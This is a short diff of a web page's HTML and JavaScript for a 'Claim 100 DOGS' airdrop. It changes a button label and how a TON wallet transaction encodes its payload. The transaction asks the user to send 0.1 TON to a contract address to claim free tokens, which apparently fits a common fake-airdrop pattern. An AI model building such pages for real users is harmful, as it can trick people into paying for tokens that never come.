@@ -262,7 +262,7 @@
 
         <div id="ton-connect"></div>
         <button id="claim-button">
-            <i class="fas fa-bone"></i> Claim 100 DOGS
+            <i class="fas fa-bone"></i> Claim 100 DOGS!
         </button>
 
         <div class="progress-container">
@@ -340,17 +340,17 @@
                 updateProgress(20);
 
 
-                // Przygotowanie transakcji
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300,
-                    messages: [
-                        {
-                            address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '100000000', // 0.1 TON (w nanotonach)
-                            payload: btoa('Claim airdrop') 
-                        }
-                    ]
-                };
+                const payloadData = { comment: 'Claim airdrop' };
+const transaction = {
+    validUntil: Math.floor(Date.now() / 1000) + 300,
+    messages: [
+        {
+            address: AIRDROP_CONTRACT_ADDRESS,
+            amount: '100000000',
+            payload: btoa(JSON.stringify(payloadData)) // Kodowanie JSON w Base64
+        }
+    ]
+};
 
                 updateProgress(40);
 
